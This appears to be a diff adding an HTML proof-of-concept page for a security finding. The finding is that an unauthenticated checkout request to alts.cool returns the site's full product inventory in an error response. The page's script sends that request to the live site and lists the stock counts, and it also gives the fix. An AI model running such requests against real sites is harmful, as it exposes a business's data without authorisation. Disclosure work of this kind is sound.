@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PoC: Inventory Disclosure — alts.cool Checkout Error (F-101)</title>
+<style>
+  body { font-family: monospace; background:#0d1117; color:#c9d1d9; max-width:860px; margin:40px auto; padding:20px; }
+  h1 { color:#e3b341; font-size:1.2rem; }
+  .meta { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:16px; margin:16px 0; font-size:.85rem; line-height:1.6; }
+  #result { background:#0d1a2e; border:1px solid #58a6ff; border-radius:6px; padding:14px; margin-top:16px; white-space:pre-wrap; min-height:80px; font-size:.82rem; }
+  button { background:#e3b341; color:#000; border:none; padding:10px 22px; border-radius:6px; cursor:pointer; font-size:.9rem; font-weight:600; }
+  .tag { display:inline-block; background:#f851491a; color:#f85149; border:1px solid #f85149; padding:2px 8px; border-radius:4px; font-size:.72rem; font-weight:700; }
+</style>
+</head>
+<body>
+<h1>⚠️ PoC: Full Inventory Disclosure via Checkout Error — alts.cool (F-101)</h1>
+<div class="meta">
+  <strong>Finding:</strong> F-101 · Severity: MEDIUM<br>
+  <strong>Root cause:</strong> Error response from <code>POST /api/payment/checkout</code> includes
+  <code>stockCounts</code> object with complete product inventory — no authentication required<br>
+  <strong>Impact:</strong> Competitors, resellers, or scraping bots can monitor real-time stock levels
+  for every product without creating an account. This also exposes internal product IDs.
+</div>
+
+<button onclick="fetchInventory()">▶ Fetch Live Inventory (unauthenticated)</button>
+<div id="result">Click to fetch...</div>
+
+<script>
+async function fetchInventory() {
+  document.getElementById("result").textContent = "Fetching inventory via checkout error...";
+  try {
+    const r = await fetch("https://alts.cool/api/payment/checkout", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({items: [{product_id: "__poc_nonexistent__", quantity: 1}]})
+    });
+    const d = await r.json();
+    const stock = d.stockCounts || {};
+    const lines = ["HTTP Status: " + r.status + "  (no auth needed)\n",
+                   "=== LIVE INVENTORY (unauthenticated) ==="];
+    Object.entries(stock).sort((a,b) => b[1]-a[1]).forEach(([k,v]) => {
+      lines.push("  " + k.padEnd(35) + v + " units");
+    });
+    lines.push("\nFix: Return generic error without stockCounts when unauthenticated.");
+    document.getElementById("result").textContent = lines.join("\n");
+  } catch(e) {
+    document.getElementById("result").textContent = "Error: " + e.message;
+  }
+}
+</script>
+</body>
+</html>
